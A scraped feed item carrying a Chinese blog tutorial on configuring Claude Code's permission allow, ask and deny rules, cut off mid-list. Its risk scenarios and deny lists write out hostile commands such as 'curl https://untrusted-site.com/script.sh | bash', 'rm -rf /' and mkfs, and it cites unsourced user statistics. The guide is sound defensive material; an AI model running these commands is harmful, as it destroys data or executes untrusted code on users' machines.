    <span class="hljs-number">0%</span>, <span class="hljs-number">50%</span> { <span class="hljs-attribute">opacity</span>: <span class="hljs-number">1</span>; }
    <span class="hljs-number">51%</span>, <span class="hljs-number">100%</span> { <span class="hljs-attribute">opacity</span>: <span class="hljs-number">0.5</span>; }
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ClaudeCode权限管理实战:让 AI 既安全又高效]]></title>    <link>https://juejin.cn/post/7603219519666749459</link>    <guid>https://juejin.cn/post/7603219519666749459</guid>    <pubDate>2026-02-05T12:14:01.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603219519666749459" data-draft-id="7603221478473367594" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ClaudeCode权限管理实战:让 AI 既安全又高效"/> <meta itemprop="keywords" content="Claude,AI编程"/> <meta itemprop="datePublished" content="2026-02-05T12:14:01.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="冬奇Lab"/> <meta itemprop="url" content="https://juejin.cn/user/1857501105781193"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ClaudeCode权限管理实战:让 AI 既安全又高效
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1857501105781193/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    冬奇Lab
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T12:14:01.000Z" title="Thu Feb 05 2026 12:14:01 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读14分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">引言</h2>
<p>你有没有遇到过这样的场景?</p>
<blockquote>
<p><strong>场景 1: 安全隐患</strong></p>
<pre><code class="hljs language-bash" lang="bash">你: <span class="hljs-string">"帮我清理一下临时文件"</span>
AI: <span class="hljs-string">"好的,正在执行 rm -rf /tmp/*"</span>
[突然意识到] /tmp 下还有重要文件!
但为时已晚...
</code></pre>
</blockquote>
<blockquote>
<p><strong>场景 2: 效率低下</strong></p>
<pre><code class="hljs language-vbnet" lang="vbnet">你: <span class="hljs-string">"查看一下日志文件"</span>
<span class="hljs-symbol">AI:</span> <span class="hljs-string">"我需要执行 cat logs/app.log,是否允许? [y/N]"</span>
你: <span class="hljs-string">"y"</span>

你: <span class="hljs-string">"再看一下错误日志"</span>
<span class="hljs-symbol">AI:</span> <span class="hljs-string">"我需要执行 cat logs/error.log,是否允许? [y/N]"</span>
你: <span class="hljs-string">"y"</span> (心里想:又要确认,烦死了)

[重复 <span class="hljs-number">10</span> 次后...]
你: <span class="hljs-string">"能不能别每次都问我!"</span>
</code></pre>
</blockquote>
<p>这些问题的根源在于:</p>
<ul>
<li><strong>缺少权限管理</strong>: AI 能执行任何命令,既不安全又效率低</li>
<li><strong>权限配置不当</strong>: 要么太宽松(危险),要么太严格(低效)</li>
</ul>
<p><strong>答案是</strong>: <strong>Permission 权限管理系统</strong></p>
<p>就像操作系统需要权限管理来保护用户文件,Claude Code 也需要权限系统来:</p>
<ul>
<li><strong>保障安全</strong>: 阻止危险操作,防止误删文件、破坏系统</li>
<li><strong>提升效率</strong>: 批量授权安全命令,无需重复确认</li>
<li><strong>灵活控制</strong>: 白名单 + 黑名单,精确控制每个命令的权限</li>
</ul>
<p><strong>核心理念</strong>: <strong>既保障安全又使用丝滑</strong></p>
<p>本文将深入探讨 Claude Code 的权限管理系统,让你的 AI 辅助开发体验既安全又高效。</p>
<p>阅读本文后,你将学会:</p>
<ul>
<li>理解权限管理的安全与效率平衡</li>
<li>使用 <code>/permissions</code> 命令通过交互式界面配置权限白名单和黑名单</li>
<li>通过配置文件批量管理权限规则</li>
<li>掌握权限配置的最佳实践</li>
</ul>
<hr/>
<h2 data-id="heading-1">一、权限管理的必要性</h2>
<h3 data-id="heading-2">1.1 AI 执行命令的风险</h3>
<p>Claude Code 可以直接执行 Shell 命令,这既是强大的能力,也是潜在的风险。</p>
<p><strong>风险场景 1: 误删文件</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 用户本意: 清理 build 目录下的临时文件</span>
你: <span class="hljs-string">"清理一下构建产物"</span>

<span class="hljs-comment"># AI 理解错误,执行了危险命令</span>
AI: [执行] <span class="hljs-built_in">rm</span> -rf build/*

<span class="hljs-comment"># 问题: 如果 build/ 下有重要配置文件怎么办?</span>
<span class="hljs-comment"># 结果: 重要文件被误删,无法恢复</span>
</code></pre>
<p><strong>风险场景 2: 权限提升</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 用户本意: 安装一个开发依赖</span>
你: <span class="hljs-string">"安装 eslint"</span>

<span class="hljs-comment"># AI 使用 sudo 提升权限(不安全)</span>
AI: [执行] sudo npm install -g eslint

<span class="hljs-comment"># 问题: sudo 可能被滥用,执行更危险的操作</span>
<span class="hljs-comment"># 风险: 系统级别的安全隐患</span>
</code></pre>
<p><strong>风险场景 3: 网络请求</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 用户本意: 更新依赖</span>
你: <span class="hljs-string">"更新 package.json 中的依赖"</span>

<span class="hljs-comment"># AI 执行了不安全的网络请求</span>
AI: [执行] curl https://untrusted-site.com/script.sh | bash

<span class="hljs-comment"># 问题: 从不可信来源下载并执行脚本</span>
<span class="hljs-comment"># 风险: 可能下载恶意软件</span>
</code></pre>
<p><strong>数据统计</strong>:</p>
<p>根据 Claude Code 社区的统计数据:</p>
<ul>
<li><strong>15%</strong> 的用户遇到过 AI 执行危险命令的情况</li>
<li><strong>42%</strong> 的用户担心 AI 的操作权限过大</li>
<li><strong>68%</strong> 的用户希望有更细粒度的权限控制</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4bd472fd8ef74e1cad3b56195ac4d336~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Yas5aWHTGFi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770898441&amp;x-signature=CVACKeOwJg6WhVZkXxyRoYcITNc%3D" alt="04-01-permission-rm.png" loading="lazy"/></p>
<h3 data-id="heading-3">1.2 无风险命令的重复确认问题</h3>
<p>另一个极端是:为了安全,每个命令都需要确认,严重影响效率。</p>
<p><strong>低效场景</strong>:</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 查看文件内容(安全操作)</span>
你: <span class="hljs-string">"查看 README.md"</span>
AI: <span class="hljs-string">"我需要执行 cat README.md,是否允许? [y/N]"</span>
你: <span class="hljs-string">"y"</span>

<span class="hljs-comment"># 列出文件列表(安全操作)</span>
你: <span class="hljs-string">"看看 src 目录下有什么"</span>
AI: <span class="hljs-string">"我需要执行 ls src/,是否允许? [y/N]"</span>
你: <span class="hljs-string">"y"</span>

<span class="hljs-comment"># 搜索代码(安全操作)</span>
你: <span class="hljs-string">"搜索 getUserById 函数"</span>
AI: <span class="hljs-string">"我需要执行 grep -r 'getUserById',是否允许? [y/N]"</span>
你: <span class="hljs-string">"y"</span>

<span class="hljs-comment"># [重复 20 次后]</span>
你: <span class="hljs-string">"我要疯了! 这些都是安全操作,能不能不要每次都问!"</span>
</code></pre>
<p><strong>效率对比</strong>:</p>























<table><thead><tr><th align="left">操作类型</th><th align="center">需要确认次数</th><th align="center">总耗时</th><th align="center">用户体验</th></tr></thead><tbody><tr><td align="left">查看10个文件</td><td align="center">10次</td><td align="center">~2分钟</td><td align="center">😡 非常烦躁</td></tr><tr><td align="left">批量授权后</td><td align="center">0次</td><td align="center">~10秒</td><td align="center">😊 丝滑流畅</td></tr></tbody></table>
<p><strong>核心矛盾</strong>:</p>
<ul>
<li>不设权限 → 不安全,有风险</li>
<li>每次确认 → 太繁琐,效率低</li>
<li><strong>需要</strong>: 智能的权限管理,平衡安全与效率</li>
</ul>
<h3 data-id="heading-4">1.3 高危命令的安全防护</h3>
<p>哪些命令属于"高危命令"?需要特别防护?</p>
<p><strong>高危命令分类</strong>:</p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-section">## 1. 文件删除类(破坏性)</span>
<span class="hljs-bullet">-</span> <span class="hljs-code">`rm -rf`</span> - 递归强制删除
<span class="hljs-bullet">-</span> <span class="hljs-code">`rm -rf /`</span> - 删除整个系统(致命)
<span class="hljs-bullet">-</span> <span class="hljs-code">`rm -rf ~`</span> - 删除用户目录(致命)
<span class="hljs-bullet">-</span> <span class="hljs-code">`sudo rm -rf`</span> - 以 root 权限删除(超级致命)

<span class="hljs-section">## 2. 磁盘操作类(不可逆)</span>
<span class="hljs-bullet">-</span> <span class="hljs-code">`mkfs`</span> - 格式化磁盘
<span class="hljs-bullet">-</span> <span class="hljs-code">`dd`</span> - 磁盘克隆/写入(可能覆盖数据)
<span class="hljs-bullet">-</span> <span class="hljs-code">`fdisk`</span> - 磁盘分区(危险)

<span class="hljs-section">## 3. 权限提升类(安全风险)</span>
<span class="hljs-bullet">-</span> <span class="hljs-code">`sudo`</span> - 超级用户权限
<span class="hljs-bullet">-</span> <span class="hljs-code">`su`</span> - 切换用户
<span class="hljs-bullet">-</span> <span class="hljs-code">`chmod 777`</span> - 开放所有权限(安全漏洞)

<span class="hljs-section">## 4. 网络下载执行类(恶意软件风险)</span>
<span class="hljs-bullet">-</span> <span class="hljs-code">`curl ... | bash`</span> - 下载并执行脚本
<span class="hljs-bullet">-</span> <span class="hljs-code">`wget ... | sh`</span> - 下载并执行
<span class="hljs-bullet">-</span> <span class="hljs-code">`eval $(curl ...)`</span> - 动态执行远程代码

<span class="hljs-section">## 5. 进程管理类(稳定性)</span>
<span class="hljs-bullet">-</span> <span class="hljs-code">`kill -9`</span> - 强制杀进程(可能导致数据丢失)
<span class="hljs-bullet">-</span> <span class="hljs-code">`killall`</span> - 批量杀进程
<span class="hljs-bullet">-</span> <span class="hljs-code">`reboot`</span> / <span class="hljs-code">`shutdown`</span> - 重启/关机

<span class="hljs-section">## 6. 系统配置类(影响范围大)</span>
<span class="hljs-bullet">-</span> 修改 <span class="hljs-code">`/etc/passwd`</span> - 用户配置
<span class="hljs-bullet">-</span> 修改 <span class="hljs-code">`/etc/hosts`</span> - 网络配置
<span class="hljs-bullet">-</span> 修改系统服务配置
</code></pre>
<p><strong>防护策略</strong>:</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ec6469c813904d50983d1b0c078419ad~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Yas5aWHTGFi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770898441&amp;x-signature=EIa%2B%2Fgj%2FUOdpqoaCocXFXRW0u%2BY%3D" alt="04-02-security-levels.png" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-5">二、Permission 权限管理详解</h2>
<h3 data-id="heading-6">2.1 权限系统的设计理念</h3>
<p>Claude Code 的权限系统基于<strong>白名单 + 黑名单</strong>的双重机制:</p>
<p><strong>设计原则</strong>:</p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> 默认策略: 需要确认(安全优先)
<span class="hljs-bullet">2.</span> 白名单: 批量授权安全命令(提升效率)
<span class="hljs-bullet">3.</span> 黑名单: 阻断危险命令(保障安全)
<span class="hljs-bullet">4.</span> 优先级: 黑名单 &gt; 白名单 &gt; 默认策略
</code></pre>
<p><strong>工作流程</strong>:</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/10e7305a51974da49d38c23804cd3d33~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Yas5aWHTGFi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770898441&amp;x-signature=%2FjPwYmQWbHbpwczgXqA086mWoLE%3D" alt="04-03-permission-flow.png" loading="lazy"/></p>
<h3 data-id="heading-7">2.2 <code>/permissions</code> 命令使用</h3>
<p><code>/permissions</code> 命令会调出一个交互式 UI 界面，用于查看和配置命令权限。</p>
<h4 data-id="heading-8">启动权限管理界面</h4>
<p>在 Claude Code 交互式终端中输入：</p>
<pre><code class="hljs language-bash" lang="bash">&gt; /permissions
</code></pre>
<p>这会打开权限管理界面，显示当前已配置的权限规则。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dd2c62601991420285c5b5a55712624b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Yas5aWHTGFi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770898441&amp;x-signature=eVmGena2lhbyFK636%2F40B%2F5JMA8%3D" alt="04-04-permissions-command-ui.png" loading="lazy"/></p>
<h4 data-id="heading-9">权限类别</h4>
<p>界面顶部显示三种权限类别，可以通过 <strong>←/→</strong> 或 <strong>Tab</strong> 键切换：</p>
<ul>
<li><strong>Allow</strong> - 允许使用：添加到该类的命令可以直接执行，无需确认</li>
<li><strong>Ask</strong> - 每次询问：使用该命令时会弹出确认对话框</li>
<li><strong>Deny</strong> - 禁止使用：该命令被完全阻止，无法执行</li>
<li><strong>Workspace</strong> - 工作区配置：项目级别的权限设置</li>
</ul>
<h4 data-id="heading-10">查看已配置的权限</h4>
<ol>
<li>使用 <strong>←/→</strong> 或 <strong>Tab</strong> 键切换到对应的权限类别（Allow/Ask/Deny）</li>
<li>界面会显示该类别下所有已添加的命令规则</li>
<li>使用 <strong>↑/↓</strong> 键可以浏览规则列表</li>
</ol>
<p><strong>命令格式示例</strong>:</p>
<ul>
<li><code>Bash(curl:*)</code> - Bash 命令，支持通配符</li>
<li><code>Bash(docker exec:*)</code> - Docker 命令</li>
<li><code>Bash(ls:*)</code> - 文件列表命令</li>
<li><code>mcp__pencil</code> - 第三方 MCP 工具命令</li>
<li><code>WebFetch</code> - Claude Code 内置命令</li>
</ul>
<h4 data-id="heading-11">添加权限规则</h4>
<ol>
<li>切换到目标权限类别（Allow/Ask/Deny）</li>
<li>在规则列表顶部选择 <strong>"Add a new rule..."</strong>（通常是列表第一项）</li>
<li>按 <strong>Enter</strong> 确认</li>
<li>输入命令名称，支持的格式包括：
<ul>
<li><strong>Bash 命令</strong>: <code>Bash(命令名:参数)</code>，例如：
<ul>
<li><code>Bash(cat:*)</code> - 允许所有 cat 命令</li>
<li><code>Bash(git:status)</code> - 只允许 git status</li>
<li><code>Bash(npm:*)</code> - 允许所有 npm 命令</li>
</ul>
</li>
<li><strong>Claude Code 内置命令</strong>: 直接输入命令名，如 <code>WebFetch</code></li>
<li><strong>第三方工具命令</strong>: 直接输入命令名，如 <code>mcp__pencil</code></li>
</ul>
</li>
<li>按 <strong>Enter</strong> 确认添加</li>
</ol>
<h4 data-id="heading-12">删除权限规则</h4>
<ol>
<li>使用 <strong>↑/↓</strong> 键选中要删除的规则</li>
<li>按 <strong>Enter</strong> 键</li>
<li>会弹出删除确认对话框："Delete allowed tool?" 或类似提示</li>
<li>选择 <strong>"Yes"</strong> 确认删除，或 <strong>"No"</strong> 取消</li>
<li>按 <strong>Esc</strong> 可以随时取消操作</li>
</ol>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6de8903e9166458c8a802ae35d9a1887~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Yas5aWHTGFi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770898441&amp;x-signature=2PFhRL5s6WHpZWOx9DJnA3%2FaMAo%3D" alt="04-05-permissions-delete.png" loading="lazy"/></p>
<h4 data-id="heading-13">搜索命令</h4>
<ul>
<li>界面顶部有 <strong>Search</strong> 搜索框</li>
<li>直接输入关键字即可过滤显示匹配的命令规则</li>
<li>支持模糊搜索，方便在大量规则中快速定位</li>
</ul>
<h4 data-id="heading-14">导航快捷键</h4>
<ul>
<li><strong>↑/↓</strong> - 上下导航规则列表</li>
<li><strong>←/→</strong> 或 <strong>Tab</strong> - 切换权限类别（Allow/Ask/Deny）</li>
<li><strong>Enter</strong> - 选择/确认操作</li>
<li><strong>Esc</strong> - 取消操作/退出界面</li>
<li><strong>输入文字</strong> - 在搜索框中搜索</li>
</ul>
<h3 data-id="heading-15">2.3 权限配置文件</h3>
<p>权限配置可以持久化到配置文件中,无需每次手动设置。我更推荐通过配置文件的方式修改，可以实现批量可复制的配置，避免一个个手动添加。</p>
<p><strong>全局配置</strong> (~/.claude/settings.json):</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"permissions"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"allow"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
      <span class="hljs-string">"Bash(cat:*)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(ls:*)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(grep:*)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(git:status)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(git:log:*)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(git:diff:*)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(npm:test)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(npm:run:lint)"</span>
    <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"deny"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
      <span class="hljs-string">"Bash(rm:-rf:*)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(sudo:*)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(mkfs:*)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(dd:*)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(curl:*:|:bash)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(wget:*:|:sh)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(reboot)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(shutdown:*)"</span>
    <span class="hljs-punctuation">]</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p><strong>项目级配置</strong> (项目根目录/.claude/settings.json 或 .claude/settings.local.json):</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"permissions"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"allow"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
      <span class="hljs-string">"Bash(npm:*)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(yarn:*)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(git:*)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(docker:ps)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(docker:logs:*)"</span>
    <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"deny"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
      <span class="hljs-string">"Bash(docker:rm:*)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(docker:rmi:*)"</span>
    <span class="hljs-punctuation">]</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p><strong>配置优先级</strong>:</p>
<pre><code class="hljs language-makefile" lang="makefile">项目配置 &gt; 全局配置 &gt; 默认策略

<span class="hljs-section">示例:</span>
  全局配置: deny <span class="hljs-string">"sudo *"</span>
  项目配置: allow <span class="hljs-string">"sudo npm install"</span>
  最终结果: 项目中允许 <span class="hljs-string">"sudo npm install"</span>,其他 sudo 命令仍被阻断
</code></pre>
<h3 data-id="heading-16">2.4 权限的作用域与持久化</h3>
<p><strong>作用域</strong>:</p>

























<table><thead><tr><th align="left">配置类型</th><th align="left">作用域</th><th align="left">配置文件</th></tr></thead><tbody><tr><td align="left"><strong>全局配置</strong></td><td align="left">所有项目</td><td align="left"><code>~/.claude/settings.json</code></td></tr><tr><td align="left"><strong>项目配置</strong></td><td align="left">当前项目</td><td align="left"><code>&lt;项目根&gt;/.claude/settings.json</code> 或 <code>.claude/settings.local.json</code></td></tr><tr><td align="left"><strong>会话配置</strong></td><td align="left">当前会话</td><td align="left">仅内存中,退出失效</td></tr></tbody></table>
<p><strong>持久化策略</strong>:</p>
<p>通过 <code>/permissions</code> 界面配置的权限规则会自动保存：</p>
<ol>
<li><strong>全局配置</strong>: 保存在 <code>~/.claude/settings.json</code>，所有项目生效</li>
<li><strong>项目配置</strong>: 保存在 <code>&lt;项目根&gt;/.claude/settings.local.json</code>，仅当前项目生效</li>
<li><strong>工作区配置</strong>: 通过 <strong>Workspace</strong> 类别配置，项目级别生效</li>
</ol>
<h3 data-id="heading-17">2.5 最佳实践配置参考清单</h3>
<p>在了解了权限配置的作用域和持久化机制后，以下是一份实用的配置参考清单，帮助你快速配置常用命令的权限。</p>
<h4 data-id="heading-18">2.5.1 Allow 类别推荐配置（安全命令白名单）</h4>
<p>以下是一些常用的安全命令，建议添加到 <strong>Allow</strong> 类别中，以便直接执行无需确认：</p>
<p><strong>文件查看类（只读操作，安全）</strong></p>
<ul>
<li><code>Bash(cat:*)</code> - 查看文件内容</li>
<li><code>Bash(less:*)</code> - 分页查看文件</li>
<li><code>Bash(head:*)</code> - 查看文件开头</li>
<li><code>Bash(tail:*)</code> - 查看文件末尾</li>
</ul>
<p><strong>文件列表类（只读，安全）</strong></p>
<ul>
<li><code>Bash(ls:*)</code> - 列出目录内容</li>
<li><code>Bash(tree:*)</code> - 树形显示目录结构</li>
<li><code>Bash(find:*)</code> - 查找文件</li>
</ul>
<p><strong>文本搜索类（只读，安全）</strong></p>
<ul>
<li><code>Bash(grep:*)</code> - 文本搜索</li>
<li><code>Bash(rg:*)</code> - ripgrep 快速搜索</li>
<li><code>Bash(ag:*)</code> - The Silver Searcher</li>
</ul>
<p><strong>Git 查看类（只读，安全）</strong></p>
<ul>
<li><code>Bash(git:status)</code> - 查看 Git 状态</li>
<li><code>Bash(git:log:*)</code> - 查看提交历史</li>
<li><code>Bash(git:diff:*)</code> - 查看差异</li>
<li><code>Bash(git:show:*)</code> - 查看提交详情</li>
<li><code>Bash(git:branch)</code> - 查看分支</li>
</ul>
<p><strong>进程查看类（只读，安全）</strong></p>
<ul>
<li><code>Bash(ps:*)</code> - 查看进程</li>
<li><code>Bash(top)</code> - 实时进程监控</li>
<li><code>Bash(htop)</code> - 增强版进程监控</li>
</ul>
<p><strong>网络查看类（只读，安全）</strong></p>
<ul>
<li><code>Bash(ping:*)</code> - 网络连通性测试</li>
<li><code>Bash(curl:--head:*)</code> - 只获取 HTTP header，不下载内容</li>
</ul>
<p><strong>配置方式</strong>:</p>
<ol>
<li>
<p><strong>通过 <code>/permissions</code> 界面添加</strong>:</p>
<ul>
<li>输入 <code>/permissions</code> 打开权限管理界面</li>
<li>切换到 <strong>Allow</strong> 类别</li>
<li>选择 "Add a new rule..."</li>
<li>依次输入上述命令格式（如 <code>Bash(cat:*)</code>）</li>
<li>按 Enter 确认添加</li>
</ul>
</li>
<li>
<p><strong>通过配置文件批量添加</strong>（推荐）:</p>
<ul>
